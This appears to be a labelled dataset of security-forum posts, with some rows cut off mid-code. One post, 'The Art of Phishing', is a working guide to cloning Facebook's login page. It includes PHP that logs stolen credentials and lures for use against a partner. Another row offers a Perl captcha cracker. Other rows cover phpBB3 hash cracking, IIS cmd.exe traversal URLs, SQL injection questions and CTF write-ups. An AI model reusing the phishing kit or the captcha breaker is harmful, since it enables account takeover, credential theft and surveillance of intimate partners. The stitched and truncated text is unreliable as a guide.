rockyou.txt pentest-01.cap this concludes my guide on wep and wpa2. if you liked this guide or have questions you can leave a comment and i will try and respond to you soon =)"

1	Cgi-bin, htaccess/passwd question	hey guys,      ive been practicing web app pentesting pretty intensely over the last week (nothing illegal, in fact, ive noticed how easy it is for someone to catch a still quite senseless, lurking  intruder  such as myself) and am getting pretty consistent at how to find the directory structure of web apps, more recently with uniscan (& tools of that sort, which make it childs play)and learning burp suite, but for the most part, just poking through the sites, http headers, inserting javascript, sql, xss (relatively basic stuff) and  trying to visualize the interaction between my browser and a web application & what the hell is going on and why.  this really is what intrigues me the most, not playing with the tools.   from my shallow understanding, the app behavior and error messages essentially structure the site for you, which now really makes it interesting when you get an error response, instead of a sad, loser feeling.  basically been reading up on databases, apache, mysql, mssql, sqllite, postgressql, etc.  and taking an very insightful course on pluralsight entitled hack yourself first as well as several yt channels.  just wanted to give a quick update, more so to myself, about my progress.  all this leads me to my question: ive discovered urls of particular sites which look like this:    http://www.example.com/cgi-bin/cmd.exe?/c+dir                              /cgi-bin/.htaccess                              /cgi-bin/.htaccess.save                              /cgi-bin/.htaccess~                              /cgi-bin/htpasswd http://www.example.com/.htaccess                             /.htpasswd http://www.example.com/rpc/..%255c..%25 ... exe?/c+dir http://www.exapmle.com/search/htx/sqlqhit.asp http://www.example.com/search/htx/sqlqhit.asp is this what it looks like?  when i noticed this, i assumed this is very useful information.  from the looks of it, they are direct urls to the command promt of a windows server, which makes sense since in the header it reveals its a iis.  im currently reading up on cgi-bin and have found several sites with direct exploits to them, altho they date to 2005! this line from wiki is very intriguing:  cgi extends this system by allowing the owner of the web server to designate a directory within the document collection as containing executable scripts (or binary files) instead of pre-written pages; this is known as a cgi directory.    as tempting as it looks, and believe me, it is, im interested in the theoretical part of what i am looking at and am not foolish enough to attempt to do something i dont even know how to do.  missions on this site, and several purposefully vulnerable, educationsal web apps is where i currently belong.  i just dont have anyone to communicate stuff like this about and thought to post it here would be my best bet.   so what exactly am i looking at?  typing in the url redirects you (which i anticipated, just looking for an error response) or gives you an error that its been temp moved, or permanently moved.  to find that out, i had to use tamper data to direct it to the specific url since it automatically redirects by itslef.  am i pushing the boundaries of whats legally acceptable by trying to view that content through the url?  im just really curious as to what im looking at, since im still new to this, and am quite amazed that i have found something like this (if its worth anything at all) by myslef for the first time, with no external guidance.  any comments, help, guidance would be greatly appreciated. cheers!
0	The Art of Phishing	"disclaimer: you are responsible for all your actions. i do not condone any illegal activities, nor does hackthissite. this information is purely for educational purposes.  all credentials gathered from individuals visiting my phishing page released within this article, are considered to have given prior consent, and made knowledgeable of the consequences, as well as the information withheld inside this article before entering confidential information to my site. getting access to your girlfriends facebook:   so, she is your girlfriend and most likely not tech-savy.   you claim she might be cheating on you, or hiding something, but really you are just a paranoid psycho.   the easiest way you can take over her account is from social engineering. if you cant convince your girlfriend to do something, you are terrible at life.   i would talk about some plugins like firesheep, however with the uproar in ssl, this isnt a very viable option.   so instead, i will be demonstrating how phishing attacks are crafted, and the methodology behind them.   in layman terms, a phishing attack is simply creating a web page that looks as similar as possible to the sites login page that you want the users information from.   this new, maliciously crafted web page will host a script that grabs the users credentials and logs them. phishing a. web design structure   1. html & css   2. php & sql b. forms   1. what is a form   2. get & post   3. common uses of forms c. phishing   1. looking at the source   2. cloning a page   3. modify the clone   4. logging credentials   5. redirecting d. social engineering & tactics   1. homepage / bookmarks   2. sending a link   3. url redirects   4. wait bait   5. spoofing e-mail   6. spoofing numbers   7. portability a. [web design structure]   1. [html & css]     - html is the part of a web page that handles the structure behind the page.     - css is the part of a page that will tell things where to go, what to look like, etc. css is essentially there to make the page look pretty   2. [php & sql]     - php is a server side language, that handles things like sessions, cookies, and user input. if you have ever noticed a .php extension on a page you are visiting, thats a file which contains php code. php is usually used to do         something with user input, or to create dynamic content for the user. php is also the most common language used in web development, and for communicating with a database.     - sql or server query language, is a language that is used to communicate with a database. databases usually contain confidential and relevant information, such as: usernames, passwords, ip history, credit card information, etc   if a car was a web page, the frame would be the html (basic structure), the paint and furniture would be the css (making it appear more pretty), the gas pedal would be considered the php (does something with user input, and in a way communicates with the gas tank), and the dash board would be considered the database (holds relevant information) b. [forms]   1. [what is a form]     - a form is a piece of html code that is used to get information from a user. a form can send out the information gathered to be processed by some other scripts (usually php scripts)     - an example form below would take some username/password and send it off to get processed by a file called process.php   code:  select all <form name=""input"" action=""process.php"" method=""post""> username: <input type=""text"" name=""user""> password: <input type=""password"" name=""pass""> <input type=""submit"" value=""login""> </form>     2. [get & post]     - i assume its worth mentioning the difference between get and post data forms. a post form like the one above (notice the  method=""post""  attribute) will pass things to the action page in a hidden manner. a get form would pass the data to the page using additional parameters. an example from the above with username: bob and password: bob101 would look similar to  http://www.site.com/process.php?user=bob&pass=bob101 . when passing along confidential information, be weary of the difference, and dont use a get form.   3. [common uses of forms]     - one of the most common type of form you will likely encounter is a login form, which usually asks for a username (or email) and a password.     - forms are used to process transactions (like buying things on ebay or amazon)     - registration forms are used to get user information during the registration process.     - forms even handle things like changing account security details c. [phishing]   now that we have some general knowledge on what a form is, and how web pages are constructed, we can get onto the more fun stuff. like performing a phishing attack.   my goal here isnt to just show you how to get credentials. my goal is to help you learn something new, hence the information talked about up to this point.   1. [looking at the source]     - you can view any pages source code at any time by hitting the cntrl+u shortcut on your keyboard. viewing a pages source code can cue you in on many things (like potential vulnerabilities), but thats a story for another day.   2. [cloning a page]     - okay, the title is somewhat misleading, we will not literally be cloning a page. we will be creating a page that looks just like another page. the reason that we can not actually clone the page, is because we will not always have access to the server side code being used. however, we can grab all the client side code, like the html, css, and javascript, which is really all we will be needing to make the page look identical to our target page. so this process is actually going to be very simple. navigate to the login page of the target website (in the case of facebook, the login is on the home page) hit cntrl+u to view the page source. now, you are simply going to copy all the code. the shortcut for this is hitting cntrl+a to select all, then hitting cntrl+c to copy the code. now that you have the code, we need to discuss hosting. you can host files locally on your own computer, or you can get a domain for some small fee. whichever case you choose to go with, just make sure you are able to execute php code. for a server i also recommend you have some database access. (im not going over how to set up a server, locally or otherwise in this tutorial). so, now you are going to want to take the information and save it to a file with a name similar to login.php to make things appear less suspicious.   3. [modifying the clone]     - so, now that you have the cloned page, there is a major change you are going to want to make. in the case of facebook our source code should look like so:   code:  select all <!doctype html> <html lang=""en"" id=""facebook"" class=""no_js""> <head><meta charset=""utf-8"" /><script>function envflush(a){function b(c){for(var d in

                       </body></html>     thats a lot of data to sift through, so i recommend you hit cntrl+f and search for the following:  action=     the action should be similar to  action=""/login.php?login_attempt=1""  this is telling the form where to send the data off to, so we are going to want to modify this value.     for now, go ahead and change it to the following  action=""/login_failed.php""   4. [logging credentials]      - now that we have a page that looks identical to our target sites login page, and modified the form to point to a local file, lets create that file and have it log the credentials.      let me start by saying that there are many ways to log someones credentials, i may mention some and not go into details, but i advise you look into all the different options. create a file named login_failed.php in the same directory as the fake login page, and use your choice of any of the following logging methods:      text file approach - saving the credentials to a local text file (make sure you have permissions to write to the file)   code:  select all <?php        // replace credentials.txt with the filename of your choice (and location)        $log_file = fopen(credentials.txt, a+);        // make sure the $_post variables are using the correct arguments        $email = $_post[email];        $pass  = $_post[pass];        $content = $email . : . $pass . ""\r"";        fwrite($log_file, $content);        fclose($log_file);        // replace the site below with the target site        header(location: https://www.facebook.com/login.php?login_attempt=1);      ?>      the database approach - take the username and password and store it in a database on a server (the below code assumes you have already created a database)   code:  select all <?php        $server   = localhost;        $username = root;        $password = pass;        $db_name  = phishing;        $con = new mysqli($server, $username, $password, $db_name);        if($con->connect_error) {          header(location: https://www.facebook.com/login.php?login_attempt=1);        }        $sql = ""insert into accounts (user, pass) values ($_post[email], $_post[pass])"";        $con->query($sql);        $con->close();        header(location: https://www.facebook.com/login.php?login_attempt=1)      ?>      the email approach - assuming you have everything installed and can send e-mails with php, you can send the information to your e-mail.      the text approach - using some apis, its possible to send a text message to your phone with the information.   5. [redirecting]     - in the code above, you will notice this line of php code several times:  code:  select all header(location: https://www.facebook.com/login.php?login_attempt=1);  this is used to redirect the user back to the actual site, so that things are not obvious, and they can try to login a second time with success. d. [social engineering & tactics]   1. [homepage / bookmarks]     - i know you know those people. their online life invloves hoping directly onto facebook. they want to get there as fast as possible. they usually have facebook set up as their homepage, or have it bookmarked. go ahead and change that homepage / bookmark to your fake login page. most of the time people will just open the browser or click the link, not thinking anything of it. repetition is a big fallacy of the human mind, and after someone becomes used to something and adapt towards it, they often overlook the small things, such as the url. (read about the seven sins of memory for additional brownie points)   2. [sending a link]     - this one requires a bit more skill, as its more noticeable than the others. the goal is to get the victim to click on the link you gave them without making them suspicious. in my opinion, this is usually easiest somewhere that you have access to html tags. you could write a tutorial for something about facebook, and have the first link appear to go to the login page, but it really doesnt, like so:  code:  select all <a href=""http://infosploit.com/test/phish.php"">https://www.facebook.com/</a>  a live example would look like this:  https://www.facebook.com/   3. [url redirects]     - if you can use something like dnsmasq, you can redirect users to your website when they attempt to visit the target site. the downfall to this approach is that the user will not be able to actually connect to the target site, which will easily draw awareness and raise flags to the victim (you also would need to change the redirects in the scripts). i recommend only doing this to things like e-mails, and banks, as you want to be prepared login quickly, get what you need, and then disable the redirects as fast as possible.   4. [wait bait]     - so, if you have a house computer or a computer that is being shared between family members (like your damned cheating wife) or friends, i recommend this approach.     load up your websites fake page, go to the url, and type in the actual pages url, so for example, i have fake facebook login located at: infosploit.com/test/phish.php, i would navigate there, and then replace the url with  https://www.facebook.com/  i would simply walk away from the computer, and wait for them to login, at that point they get redirected, thinking they entered the wrong credentials, unaware of the attack. now, a word of advice with this approach is to have ssl enabled on your site (as you can tell i dont have it enabled), so the green lock some people are always looking for, is not there.   5. [spoofing e-mail]     - if you can spoof an e-mail to your victim from an address that looks legitament on the target websites behalf, its possible you can trick them into going to the link and loging in (for some specific purpose like checking messages). here you need to just be creative and think of a reasonable message to make the user login. you do not want to post things like ""we noticed recent activity in your security questions, login <insert link here> to view the changes."" the reason i recommend against this, is because its going to draw awarness, and they may change their password after logging in to the site.   6. [spoofing numbers]     - this consists of the same things mentioned in d.5, except you will be using a spoofed number.   7. [portability]     - this will involve sending the link to people on mobile devices. if you have a server set up, you can get subdomains. i noticed on portable devices, especially phones, if the user is viewing the url, its sort of cut off and short. i recommend you take advantage of this by getting a subdomain relevant to the target site. so, if i wanted to target facebook and i own the site infosploit.com, i could get a subdomain like so: facebook.infosploit.com or similar. a lot of the times, the url is cut off, so it might only show up on their bar as ""https://facebook.info"" or similar. this will aid in making the url seem more viable to portable device users.     to give it a dummy whirl, open up  http://infosploit.com/test/phish.php  and then change the url to  https://www.facebook.com/     seems pretty legit if you just walked into a room with that computer on (minus the ssl)     feel free to post some dummy information and then check back at:  http://infosploit.com/test/.credentials.txt  for the information"
1	Help Needed	i need help to crack my back up drive  the problem is i had a server put in with a back up drive for the server - the server crashed ,the password was on the server the it guy screwed me over and now i cannot get into the back up files   is there any one out there who can help
1	SQL Injection (some help)	"once again, i wasnt sure which topic this goes in. please take it easy on me as i am a newb at this. hypothetically, if i was trying to use sql injection to get login information, what exactly do i need to do? do i need a special program or does all the code i use just need to be entered in the ""login/password"" area? i am using google search results to help me with it, i just need some clarification since it doesnt really specify where i am supposed to input this stuff.  the site end in "".aspx"" if that helps any. there is also no link for a ""forgotten password"" so i doubt there is a way i can have all the information emailed to me, correct? anyway, i would really appreciate as much help as i can get without the jerk remarks. thanks! -sodapop101"
0	phpass/phpbb3 hashing algorithm detail	"i couldnt find any complete resources on this out there, so i decided to write up a detail on the phpass/phpbb3 hashing algorithm here so that other people dont have to collect the information bit by bit like i did. enjoy! phpbb3 hashes are hashes used to store user passwords in phpbb3 forum databases. they are actually phpass hashes, just using a $h$ identifier instead of $p$ (actually, phpass 0.3 recognizes both) they look something like this: $h$9xcmlsyegtmokxu/th53bkov637o9c/ they are always 34 characters long and start with ""$h$"" to show that its a phpbb3 hash. heres a break down of the rest: the first character, 9, is a setting which indicates how many md5 passes to perform. it is decoded via phpasss own base64 encoding: ./0123456789abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz 9 is the 11th character, so that means that there will be 2^11 md5 operations. the next 8 characters, xcmlsyeg, is the hash salt. this is used once as plain text. the next 22 characters, tmokxu/th53bkov637o9c/, is the actual binary hash encoded in phpasss own base64 encoding. to compute the actual hash: first, the salt is prepended to the password and md5d (using binary output mode): $hash = md5($salt . $password, true); next, the hash is prepended to the password and md5d, repeatedly, for count number of times (where count is determined by the first character after $h$): do { 	$hash = md5($hash . $password, true); } while (--$count); then, the settings (made up of $h$, the count setting, and the salt) is prepended to a base64 encoding (phpasss own base64 encoding) of the binary hash and output: $output = substr($setting, 0, 12); $output .= _hash_encode64($hash, 16, $itoa64); return $output; hence, md5 is computed 2049 times on each input password (513 times if the php version is less than 5). you can estimate your hashes/s by taking your md5s/s and dividing it by the count (2049 in most cases). i can get ~1.2k hashes/s on each core. the salt is too long to create rainbow tables for all inputs, but dictionary attacks are still possible, yet a little difficult on large numbers of hashes. an interesting note is that if you can successfully reverse the last hash then it is very likely that youve obtained real password. hence, a successful pre-image attack on a single md5 block will break the hash. to crack a phpbb3 hash, you just have to take the count and salt, and keep hashing passwords until you find one that matches. i borrowed the following php code from some other place to figure out how this all works: code:  select all /** * * @version version 0.1 / $id: functions.php 8491 2008-04-04 11:41:58z acydburn $ * * portable php password hashing framework. * * written by solar designer <solar at openwall.com> in 2004-2006 and placed in * the public domain. * * theres absolutely no warranty. * * the homepage url for this framework is: * *   http://www.openwall.com/phpass/ * * please be sure to update the version line if you edit this file in any way. * it is suggested that you leave the main version number intact, but indicate * your project name (after the slash) and add your own revision information. * * please do not change the ""private"" password hashing method implemented in * here, thereby making your hashes incompatible.  however, if you must, please * change the hash type identifier (the ""$p$"") to something different. * * obviously, since this code is in the public domain, the above are not * requirements (there can be none), but merely suggestions. * * * hash the password */ function phpbb_hash($password) {    $itoa64 = ./0123456789abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz;

1	Anonymity - MAC Spoofing and DHCP	"this thread is for discussion purposes, trying to resolve an answer to the problem is using open wifi anonymous and how to be anonymous?  heres the solutions and their associated problems as ive discovered so far, hopefully someone can shed some expert light on the particulars. first, public wifi is not anonymous because youre most likely using dhcp servers to request a local ipv4/ipv6 address and the dhcp server records your network adapters mac address and shares it with other dhcp servers so any trace to your access point would simply lead to the mac request and lead them straight to a list of other requests in the area by that mac address. first solution:  use dedicated ""anonymous"" network adapter that is never used to request dhcp servers using your billed router with billing information. (only use with free/hacked <--illegal federal felony; wifi) second, any traffic on public wifi can be tracked by anyone else in that wifi. second solution:  encryption of packet from you (sender) before routing and before relying upon any proxies/tor.  (im not sure how to do this...but it would make sense to be able to do it to protect your typical information like banking information etc.) third, traffic intercepted on wifi may contain data that can be fingerprinted. third problem: im not too sure about finger printing or to what extent or to what extent a public router ""chaches"" or data logs...but there is mineable data, for instance ---> on to fourth problem. fourth, malware such as ""pricegong"" records your network adapters(plural) mac addresses and even after install retains it in the registry key to tag everything you browse with any browser with your mac addresses. let that one sink in for a moment. so even while youre mac spoofing, everything youre doing is recorded by your ""mac spoof"" and your real mac by pricegong, where that goes i dont know, is it a false door?  or is it a real anonymity breach?  i dont know.  how many more are there?  i dont know... considering i cant even find my real mac address in the registry key under my real network adapter, but i could find my real mac address under pricegongs tick-headed registry key (after uninstalling pricegong, that which is left)...i can only imagine that it is not easy to search for mac addresses in the registry key.  i did it by hand, and by ""find"" and by iterations of the mac address. so who knows how much malware records your mac address for tracking purposes and who knows to what datacenter it is sending it. fourth solution:  change registry keys of mac addresses where you find them where they shouldnt be...never use your ""dedicated network adapter"" for anything that can be followed by browser so that anyone who may track you would need a warrant to search for you and not merely the ability to hack into some two bit malwares database. lastly, youre going to have to get rid of any trace that your dedicated network adapter was ever used on your computer.  i dont know if that is as simple as deleting registry keys of if that would destroy your system, and like i said i can find my network adapter on the registry key but i cant find the associated mac address so i dont even what could be removed in this case...but if you were a forensic investigator what would you look for on a computer? id look for the mac address used by a specific access point and see if i could trace it to a person.  or if i find a person by detective means when investigating their computer id look for mac addresses retained by the system to see if any of them match up to the one im looking for. if this mac problem is resolved i will move on to studying ip proxies and bounce boxes and pivots and other means of just making an investigation tedious, and how to break through those. i dont think this problem is resolved 100%, but im hoping its at least more than what most people think of when they think of anonymity which in my estimation their view of anonymity is like a submarine on the surface of the ocean.  yes it can submerge, but its a sitting duck as long as it is surfaced. -- sat jan 17, 2015 3:44 pm -- oh and you may notice that i never mentioned ""mac spoofing"" as a solution directly.  since youve effectively spoofed your mac when you switch to a dedicated network card i cant imagine why youd ever really need to ""spoof your mac"" by software and i am also suspicious about how effective that really is... sure like a proxy it tricks a mac filter, but is it a transparent proxy where anyone with common sense can look right through it to the source?  the answer lies in how dhcp servers record and cache data and for how long. i suppose the answer to how long before it is re-used is the ""license"".  but the answer to how long it remains as a record of having been used by you is both on your computer and in the dhcp server, on your computer until you delete it (all of it, see the malware) and how long on the server side is i suppose proprietary information and may change from service provider to service provider?"

0	Cracking Pastebins ancient captcha with Image::Magick	"so pastebin has a sign up form, and to prevent bots they use a captcha. good enough, right? only the captcha they use is almost a decade old now, and is really weak. take a look: so a keen eye will notice immediately that the saturation of the letters is different then the background and we can easily threshold based on that in order to remove the obstructions. for this application, i actually found it easier to equalize the image first, otherwise the different colors of the various captchas require different thresholds: after thresholding and negating, we get a nice black and white image of the letters. to fix any rotation, we copy the image to each degree of rotation from -7 to 7, and then pick the one with the smallest bounding box, resulting in a (mostly) upright picture: and then simply spliting the image based on black spaces gives us each of the letters individually. now we need to match the images of the letters to their texual representation. to do that, we need to train it first by taking many different such split letters and manually organizing them into folders based on which character they are (i did this to ~160 letters to get good results, however more letters would mean more accurate recognition). then we can simply compare unknown letters to known letters with a jaccard distance and use the corresponding letter of the nearest one. simple as pie! 200 lines of esoterica grey if you want to study in more detail or crack shit  (recognition characters sold seperately) : code:  select all #!/usr/bin/perl package pastebincaptchacracker; use strict; use warnings; use base exporter; use feature say; use image::magick; use list::util reduce; our @export = qw/ breakdown_captcha solve_captcha /; # splits an image by its vertical black spaces sub split_image {    my $image = shift;    my ($width, $height) = $image->get(width, height);    # slice the image into 1 pixel wide slices to generate a heatmap of where the letters are    my @heatmap;    foreach my $i (0 .. $width - 1) {       $heatmap[$i] = reduce { $a | $b } $image->getpixels(x=>$i,y=>0,width=>1,height=>$height, map=>i);    }    @heatmap = split /\b/, join , map $_ ?

but we got pretty far. in our team "" coffee "" some of the challenges given below were solved by cake, mshred, networksecurity, rained and sandman. unless stated otherwise or if the code is part of the challenge, all code created by us is released as beerware. note that most code is perl (cake) or python 2.x (the rest), unless otherwise specified. feel free to ask the solvers any challenge specific questions you might have on hackthissites irc or the forum. 1. survey (10) description:  just a survey to see whos doing the challenges. solver:  networksecurity method:  while it is ""free points"" and i believe most people just completed it without thinking a lot about it, i look at this challenge from a whole other perspective. it happens all the time that confidential data like emails get leaked. thats why in this ctf i didnt use my personal email. also, you could see this survey as actually testing you if you, as a hacker/future hacker, completely trust the authors. dont get me wrong, i trust that the authors do not have the intention to distribute the info, but it still may happen that data is accidently leaked. thats why i completed this survey carefully, trying not to give too much data about me. anyway, after completing it, the survey gives you the flag ""thatwaseasy"" (without quotes of course). ~networksecurity 2. i like bacon (15) description:  you get a

they lost the login page (which uses get) and their username and password for the router solver:  rained method:  usually when someone doesnt know their routers username and password that means its still the default. a quick google search shows the default username and password to be blank and 0000 for the broad lanner. now onto the get request. while you could code a page in html to send the data, its easier to just use the url itself. so just send  http://compete.sctf.io/problems/2015q1/impromptuget.php?username=blank&password=0000  and youre done. 5. graphics interchange format (15)

string thats encoded with the affine chiper with values a=5 and b=2, which is encoded with a caesar cipher with a shift of 8, then atbash and finally as base64. what we need to do is reverse that process. the base64 decoded string is ""8 gl tl 10 fdan yd ld ygv rvz bd pmjpzd_fxcybctv_abllbcl"" and here we already see the last part ""pmjpzd_fxcybctv_abllbcl"" as the encoded flag. atbash is a substitution chipher where a is replaced with z, b with y etc. so decoding that we get this: ""8 to go 10 uwzm bw ow bte iea yw knqkaw_ucxbyxge_zyooyxo"". ""8 to go"" indicates the decoding was succesful. we dont know if this is a caesar chipher with a shift of +8 or -8 so we just try both. for +8 we get ""8 bw ow 10 cehu je we jbm qmi ge svysie_ckfjgfom_hgwwgfw"", but for -8 shift we get ""8 lg yg 10 more to go tlw aws qo cficso_muptqpyw_rqggqpg"" which has an indication that the decoding was succesful (""10 more to go""). the only thing we have left is an affine chipher, which explained on  wikipedia . here it is encrypted with (5x+2) (mod 26) and decrypting is explained  here  as well. by solving that we got this ""8 hg ug 10 csdq ts gs the key is always_continue_digging "". so the flag is always_continue_digging    ~networksecurity (thanks to cake for seeing my error with caesar and rained for helping me with affine) 12. crib drag (35) description:  youre given two ciphertexts. solver:  cake, rained method:  the hint crib drag refers to the word crib. the word was originally invented in wwii when cracking the enigma machine to mean a small part of known plaintext in a ciphertext. while ill not go further into the details of history (ask or search if youre interested), crib drag here means dragging the known plaintext words along the ciphertext to try and produce the plaintext. the strings are encoded with a one time pad, a code xored only once with the plaintext. the good thing about the otp is that it is unbreakable if used correctly as a ciphertext could theoretically be any plaintext depending on the key. the bad thing is that it is trivial to break it if used incorrectly, as is the case with this two/many time pad. when decoding this you have to remember that the key and the ciphertexts are interchangeable, so something found in one ciphertext, can be used in the other and vice versa. the method described here is manual, by taking educated guesses. code:  select all def two_time_pad(ciphertext1, ciphertext2):     print ""ciphertext 1:"", ciphertext1     print ""ciphertext 2:"", ciphertext2     ciphertext1=from_hex(ciphertext1)     ciphertext2=from_hex(ciphertext2)     while true:         key = raw_input(""key: "")         text1 = string_xor(ciphertext1, key)         text2 = string_xor(ciphertext2, key)         print ""text 1: "", text1         print ""hex:    "", to_hex(text1)         print ""text 2: "", text2         print ""hex:    "", to_hex(text2)         print 50*""-"" def to_hex(string):     # get the ascii value of the character, convert to hex, remove 0x and add zeroes if needed     return "" "".join([ hex(ord(x))[2:].zfill(2) for x in string ]) def from_hex(string):     # divide the characters into parts of 2, convert them to integers and determine the characters     return """".join([chr(int(string[i:i+2],16)) for i in range(0, len(string), 2)]) def string_xor(string1, string2):     # for each character x and y in string1 and string2;

encryption program and encrypted message and are told to decrypt it. solver:  cake method:  what it says on the tin. its a factorization problem and not meant to be solved by factoring the really big number (we tried, its not practical). instead lets look at how the string is actually encrypted. the encryption is done by converting each character to its decimal representation and then they are stringed together to look something like ""10195114111"". then each of those digits is mapped by doing [ z/int(character)*999 ] or [ int(z/9999) ] if the digit is zero. here, z is a really huge number derived from the factors of the other really huge number. and thats it. result: we get a random arrangement of 10 really huge numbers. now, it would be trivial to derive the associated digits just from their frequencies, but theres an easier way. if we look at ""z/int(character)*999"", we can see the authors made a serious bug here; they intended the multiply the digit by 999 and then divide z by the result. instead they divide z by the digit and multiply that by 999. as a result, youll notice that the number representing 0 will always be noticably smaller than all the others. simply take that number, multiply it by 9999 and there you have z. we can now easily calculate a map of digits to huge numbers. largenumbers.py code:  select all import math x =

2	FBI slammed on Capitol Hill for stupid encryption ideas	"fbi slammed on capitol hill for stupid ideas about encryption on april 29th, a hearing was held regarding encryption technology and potential u.s. policy responses. the current state of encryption and its criminal implications have the fbi concerned enough to express a desire for backdoors that essentially allow the ""good guys"" to catch murderers and rapists; of course it would only be available to the good guys. for topics like this, we believe ambivalence is paramount. it isnt hard to understand why the idea of ""going dark"" is a scary thing, especially for a law enforcement agency. encryption is a powerful tool that stands to protect your privacy and your liberty in ways that make it very difficult to replace. encryption is a very heavy double-edged sword, so its only natural that people have a hard time coming up with an effective solution that keeps the liberty edge sharp while dampening the edge that serves criminal activity all the way from fraud to child porn to espionage. its just not an easy conversation to have. part of what makes encryption technology so powerful is how wonderfully complex it is. skilled mathematicians and scientists make a good living developing effective and innovative encryption techniques to protect sensitive data for all of us, whether were one person, a corporation, or even a government organization. its this complexity that makes it so inappropriate to give much weight to the fantastically far-fetched solution proposed by law enforcement; whether its coming from a fear of going dark amongst criminals, or a corrupt desire to survey the american people, is irrelevant. fortunately,  the hearing discussed in this article  shows a promising enthusiasm for both civil liberties and handling security by opposing the backwards movement suggested by the fbi. if somebody were to ask you what your stance is regarding the provision of an almighty skeleton key to be used only by law enforcement, you and the majority of this community might give pretty similar answers. with such a largely complicated issue that threatens our liberty and our security if mishandled, its difficult to boil everything down to a simple question. the passion in this community for both of these things is what makes it a great place to discuss the implications of getting down from the fence on one side or the other."

3	Stupid people stories	"if you have a story about someone being stupid or its just funny, share it, cause why the hell not! back when i was in high school i always used to play around with batch and cmd, just making simple little programs to make my life easier and to do fun stuff (towel.blikenlights, ect ect) well one day i was sitting in a computer class (hardly it was all about using office, which was not what i was expecting at all and hardly a ""computer class"") i had finished my work in like 2 minutes and decided that since there wasnt anyone else around to play warcraft 3 with (there was only 1 other person who played and knew how to get it in class that day, the other guy was gone) i decided that i was going to play around with a batch file i made to lock a folder on my personal flashdrive to keep people from prying if they found it, this kid sitting next to me looks over and loudly goes ""what are you doing?!? are you hacking?!? your a hacker?!? this prompted everyone in the class to flood up behind me and stare blankly at the lines of batch i had on my screen all in awe of what they thought was hacking, i didnt really do anything i just ignored it and kept working on my code, hoping they would all buzz off after they realized that i wasnt really doing anything exciting but, the teacher ended up coming over and she assumed the exact same thing and proceeded to confiscate my flashdrive after locking my computer down with that stupid ""vision client"" they all had, she gave my flashdrive to the tech guy, whos name is actually sam (network security sam lol) and the next day he brought it back to me and kind of just chuckled to which i went ""so i take it you realize that everyone here has no idea what they are talking about right?"" to which he replied ""yeah, although its not a bad code, just dont get in trouble."" he didnt change anything or even bother looking in the folder, but to this day i still find the whole thing absolutely ridiculous. other then that, theres been like 2 occasions where someone who thought they knew what they were talking about assumed i was doing something i wasnt. though there not as interesting -- wed oct 14, 2015 2:52 am -- to add alittle bit more, i was facing expulsion until he told the principal that it was nothing, but the next year i actually was expelled (for other reason involving a knife and kid nearly getting scalped long story trust me) you dont actually just sit at home at the school district here, you goto ""alternative school"" which is just a room off limits to regular students (was supposed to be but they always came in anyway) it was still hooked up to the schools network and had all the same login info as everyone else (your name and a password of your choice and to clarify a regular student could come in and still be able to login to the computers in the room) there were so many problems with the computers in there (mostly stupid people messing with things they shouldnt) that sam actually gave me the login info for the networks admin account, so that way he didnt have to keep coming in and out to fix problems that were so basic it was sad and a waste of his time, which i dont remember the password now and it changes every year, but i was trying like hell to get that password by any means possible, and he just up and hands it to me to help him do his work, needless to say i used that to get around the website filters they had in there, the computers could only connect to 2 sites, a online schooling site and google, i have no idea why google cause its not like you could follow the hyperlinks anywhere without hitting a block, but either way, thats the story about how the year after the flash drive crap went down i was handed the keys to the network, i tried so hard and all i had to do was wait."
3	CEH path	hey folks,  only just found this site today. ive been a school it guy for the last 8 years. standard windows domain, cisco wired and wireless n network and all that. ive noticed the increase in pupils trying to circumvent network security, trying to get past filters etc. also noticed a number of them using onion browser on their phone on our guest wifi. they like to come in to my office and tell me things like this.  anyway, im now turning my attention to learning more about info security, ethical hacking and the like. i was asked to go an a course about it, and was directed to the certified ethical hacker course. im currently working on my sscp too.  came on here today and found the basic missions quite useful to get started. up to 8 so far without help in amongst doing other duties.  i firmly believe that no matter the training, there will always be someone out there far superior, however, the ceh seems like a good place to start. i know html/css. im always on the code academy doing beginning courses in code and wrote 3 android apps a few years ago for friends. it all seems natural to slip into learning about information security, however, would i be wasting my time?  cheers for the advice.
1	Is this how Reaver works?	"i googled it and only got results about how to use reaver. i looked at wikipedia and there wasnt an entry for reaver specifically. there was mentioning of it on the wps wikipedia. https://en.wikipedia.org/wiki/wi-fi_protected_setup and i quote in the summer of 2014, dominique bongard discovered what he called the ""pixie dust"" attack. this attack works only for default wps implementation of several wireless chip makers, including ralink, mediatek, realtek and broadcom. the attack focuses on a lack of randomization when generating the e-s1 and e-s2 ""secret"" nonces. if the attacker can figure out those two nonces, they can crack the pin within one minute and 30 seconds, depending on the device. a tool called pixiewps has been developed[14] and a new version of reaver has been developed to automate the process. what should i google if i want to learn how reaver works as a program? im going to read the wikipedias on all of the individual wifi protocols, although i have understanding them. now that i read wps, im guessing i read wep, wpa, and wpa2 and enterprise ones. but first, im trying to figure out how reaver works. i googled it and got a reddit question answer asked by someone else with a link: http://lifehacker.com/5873407/how-to-cr ... ith-reaver i have trouble because this is simplified and doesnt go into much detail. i also think wikipedia goes into too much detail. and i quote: the tool takes advantage of a vulnerability in something called wi-fi protected setup, or wps. its a feature that exists on many routers, intended to provide an easy setup process, and its tied to a pin thats hard-coded into the device. reaver exploits a flaw in these pins; the result is that, with enough time, it can reveal your wpa or wpa2 password. and theres a link from that that explains the vulnerability: http://arstechnica.com/business/2011/12 ... ted-setup/ but as security researcher stefan veihbock found and reported to us-cert, the pin implementation is susceptible to ""brute-force"" attacks because of the way routers respond to bad requests, and the nature of the pin itself. when a pin request fails, the message sent back to the wireless device attempting to connect contains information that can help an attacker by revealing whether the first half of the pin is correct or not—reducing the number of guesses that an attacking system would have to make. additionally, the last number of the pin is a checksum for the the rest of the pin. as a result, an attacker could get the pin within 11,000 guesses. veihbock demonstrated the vulnerability with a proof-of-concept tool he wrote in python, available for download from his site. so, heres my interpretation. obviously reaver uses a vulnerability in wps. the way that vulnerability works is it wps uses a personal identification number (pin). a brute-force attack is one in which the computer automatically guesses all different combinations for a password, passkey, pin, key, etc. a router that uses wps can be brute forced easily because it responds to bad requests in a faulty way. when returning the request, that makes the router reveal the first half of the key. then it can be brute forced. the name for the attack before the brute force attack, of sending the bad requests and waiting for the reply, what attack is it called since its obviously not the same as brute-force at that point?"
